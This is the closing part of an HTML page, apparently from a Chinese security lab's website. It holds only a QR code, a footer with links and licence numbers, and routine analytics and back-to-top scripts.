        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
